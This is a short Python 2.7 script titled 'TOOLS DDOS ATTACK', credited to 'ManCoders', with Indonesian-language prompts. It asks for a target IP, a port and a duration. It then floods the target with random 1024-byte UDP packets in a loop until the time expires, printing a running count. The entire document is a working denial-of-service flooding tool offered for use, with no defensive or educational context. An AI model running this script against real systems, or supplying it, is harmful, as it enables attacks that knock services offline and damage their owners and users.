
######### TOOLS DDOS ATTACK ##########

# code : python 2.7 

import os 
import sys 
import time
import socket 
import random 

sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(1024)
os.system('clear')
os.system('figlet DDOS')
print "---------------------------"
print "| author by : ManCoders   |"
print "| youtube   : Wolf Splash |"
print "| code      : python 2.7  |"
print "---------------------------"
ip = raw_input('masukan IP :')
port = input('jumlah PORT :')
tm = input('TIME :')

timeout = time.time() + tm 
sent = 0 

while True:
  try:
    if time.time() > timeout:
      break 
    else:
      pass
      sock.sendto(bytes,(ip,port))
      sent = sent + 1 
      print "mengirim %s ke %s melalui port %s"%(sent,ip,port)
  except KeyboardInterrupt:
    sys.exit()